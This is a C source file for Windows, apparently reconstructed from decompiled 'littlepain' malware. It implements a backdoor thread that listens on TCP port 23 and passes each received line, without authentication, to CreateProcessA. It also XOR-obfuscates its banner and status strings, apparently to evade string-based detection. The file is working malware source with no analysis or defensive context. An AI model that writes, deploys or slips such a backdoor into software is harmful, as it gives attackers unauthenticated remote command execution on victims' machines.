#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <stddef.h>

#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

DWORD WINAPI _BackDoor_4(LPVOID Data)
{
    int iVar1;
    uint32_t uVar2;
    BOOL BVar3;
    PROCESS_INFORMATION local_28c;
    STARTUPINFOA local_27c;
    char local_238[260];
    fd_set local_134;
    struct timeval local_30;
    struct sockaddr_in local_28;
    SOCKET local_18;
    SOCKET local_14;

    local_14 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (local_14 != INVALID_SOCKET) {
        local_28.sin_family = AF_INET;
        local_28.sin_addr.s_addr = htonl(INADDR_ANY);
        local_28.sin_port = htons(23);
        iVar1 = bind(local_14, (struct sockaddr *)&local_28, sizeof(struct sockaddr_in));
        if (iVar1 != -1) {
            listen(local_14, SOMAXCONN);
            do {
                local_18 = accept(local_14, NULL, NULL);
                local_30.tv_usec = 0;
                local_30.tv_sec = 60;
                local_134.fd_count = 1;
                local_134.fd_array[0] = local_18;

                // "[:: littlepain ::] by WarGame\r\n" XOR'd with key 0x3E
                volatile char sz_msg[] = {
                    '['^0x3E, ':'^0x3E, ':'^0x3E, ' '^0x3E, 'l'^0x3E, 'i'^0x3E, 't'^0x3E, 't'^0x3E,
                    'l'^0x3E, 'e'^0x3E, 'p'^0x3E, 'a'^0x3E, 'i'^0x3E, 'n'^0x3E, ' '^0x3E, ':'^0x3E,
                    ':'^0x3E, ']'^0x3E, ' '^0x3E, 'b'^0x3E, 'y'^0x3E, ' '^0x3E, 'W'^0x3E, 'a'^0x3E,
                    'r'^0x3E, 'G'^0x3E, 'a'^0x3E, 'm'^0x3E, 'e'^0x3E, '\r'^0x3E, '\n'^0x3E, 0x00^0x3E
                };
                xor_decrypt(sz_msg, sizeof(sz_msg), 0x3E);
                send(local_18, (char*)sz_msg, (int)(sizeof(sz_msg) - 1), 0);

                while (iVar1 = select(local_18 + 1, &local_134, NULL, NULL, &local_30), iVar1 > 0) {
                    memset(local_238, 0, sizeof(local_238));
                    recv(local_18, local_238, sizeof(local_238), 0);
                    uVar2 = strlen(local_238);
                    for (uint32_t local_10 = 0; local_10 < uVar2; local_10++) {
                        if ((local_238[local_10] == '\r') || (local_238[local_10] == '\n')) {
                            local_238[local_10] = '\0';
                        }
                    }
                    memset(&local_27c, 0, sizeof(local_27c));
                    memset(&local_28c, 0, sizeof(local_28c));
                    local_27c.cb = sizeof(STARTUPINFOA);
                    local_27c.dwFlags = STARTF_USESHOWWINDOW;
                    local_27c.wShowWindow = SW_SHOW;
                    BVar3 = CreateProcessA(NULL, local_238, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &local_27c, &local_28c);
                    if (BVar3 == 0) {
                        // "Not Executed!\r\n" XOR'd with key 0x7A
                        volatile char sz_not[] = {
                            'N'^0x7A, 'o'^0x7A, 't'^0x7A, ' '^0x7A, 'E'^0x7A, 'x'^0x7A, 'e'^0x7A, 'c'^0x7A,
                            'u'^0x7A, 't'^0x7A, 'e'^0x7A, 'd'^0x7A, '!'^0x7A, '\r'^0x7A, '\n'^0x7A, 0x00^0x7A
                        };
                        xor_decrypt(sz_not, sizeof(sz_not), 0x7A);
                        send(local_18, (char*)sz_not, (int)(sizeof(sz_not) - 1), 0);
                    }
                    else {
                        // "Executed!\r\n" XOR'd with key 0x1F
                        volatile char sz_ok[] = {
                            'E'^0x1F, 'x'^0x1F, 'e'^0x1F, 'c'^0x1F, 'u'^0x1F, 't'^0x1F, 'e'^0x1F, 'd'^0x1F,
                            '!'^0x1F, '\r'^0x1F, '\n'^0x1F, 0x00^0x1F
                        };
                        xor_decrypt(sz_ok, sizeof(sz_ok), 0x1F);
                        send(local_18, (char*)sz_ok, (int)(sizeof(sz_ok) - 1), 0);
                    }
                }
                closesocket(local_18);
            } while (true);
        }
    }
    return 0;
}
#pragma optimize("", on)
